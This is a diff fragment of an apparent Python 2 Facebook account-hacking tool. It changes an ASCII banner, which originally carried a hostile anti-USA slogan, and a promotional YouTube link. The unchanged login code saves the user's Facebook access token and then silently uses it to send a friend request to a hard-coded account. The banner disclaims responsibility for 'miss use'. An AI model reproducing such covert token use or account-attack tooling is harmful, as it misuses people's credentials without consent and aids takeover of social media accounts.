@@ -48,16 +48,20 @@ def jalan(z):
 ##### LOGO #####
 logo = """
  \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97m╭━━━┳╮╱╭┳━━━┳╮╭━╮╭╮╱╭┳━━━┳━━━╮\033[1;94m▒▒▒▒   ╱▔▔▔▔╲ ▒▒▒  FUCK USA ACCOUNTS 🔥
-\033[1;97m┃╭━━┫┃╱┃┃╭━╮┃┃┃╭╯┃┃╱┃┃╭━╮┃╭━╮┃\033[1;94m▒▒▒▒ ▕ ╲┊┊╱▏ ▏▒▒▒ WE ARE PAKISTANIS 🔥
-\033[1;93m┃╰━━┫┃╱┃┃┃╱╰┫╰╯╯╱┃┃╱┃┃╰━━┫┃╱┃┃\033[1;94m▒▒▒▒ ▕▕▂╱╲▂▏▏▒▒▒ WE HAVE POWER 🔥
-\033[1;93m┃╭━━┫┃╱┃┃┃╱╭┫╭╮┃╱┃┃╱┃┣━━╮┃╰━╯┃\033[1;94m▒▒▒▒   ╲┊┊┊┊╱ ▒▒▒▒
-\033[1;91m┃┃╱╱┃╰━╯┃╰━╯┃┃┃╰╮┃╰━╯┃╰━╯┃╭━╮┃\033[1;94m▒▒▒▒    ╲▂▂╱▏ ▒▒▒▒
-\033[1;91m╰╯╱╱╰━━━┻━━━┻╯╰━╯╰━━━┻━━━┻╯╱╰╯\033[1;94m▒▒▒╱▔▔┊┊┊┊▔▔╲▒▒▒
+
+
+╭━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮╱╱╭━━━━╮╱╱╱╱╭╮
+┃╭╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱┃╭╮╭╮┃╱╱╱╱┃┃
+┃╰╯╰┳━━┳━╮╭━━┳━━┳━━┫╰━╮╰╯┃┃┣┻━┳━━┫╰━╮
+┃╭━╮┃╭╮┃╭╮┫╭╮┃╭╮┃━━┫╭╮┃╱╱┃┃┃┃━┫╭━┫╭╮┃
+┃╰━╯┃╭╮┃┃┃┃╰╯┃╭╮┣━━┃┃┃┃╱╱┃┃┃┃━┫╰━┫┃┃┃
+╰━━━┻╯╰┻╯╰┻━╮┣╯╰┻━━┻╯╰╯╱╱╰╯╰━━┻━━┻╯╰╯
+╱╱╱╱╱╱╱╱╱╱╭━╯┃
+╱╱╱╱╱╱╱╱╱╱╰━━╯
 \033[1;98m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
 \033[1;91m╔🔥═══════════════════════════════════════════🔥═🔥═🔥╗
 \033[1;91m║\033[1;91m☆ \033[1;91mCOMMANDS MAKER SHAHAB ZAMAN.☠️           ║
-\033[1;91m║\033[1;91m☆ \033[1;91mYOUTUBE CHANEEL BANGSH TECH.☠️     ║
+\033[1;91m║\033[1;91m☆ \033[1;91mYOUTUBE CHANEEL BANGASH TECH.☠️     ║
 \033[1;91m║\033[1;91m☆ \033[1;91mIM.NOT.RISPONSIBLE.FOR.ANY.MISS USE.☠️ ║
 \033[1;91m╚🔥═══════════════════════════════════════════🔥═🔥═🔥╝
 """
@@ -127,7 +131,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://www.youtube.com/channel/UCJBn0JwyqujVr2LBko6rp0w')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
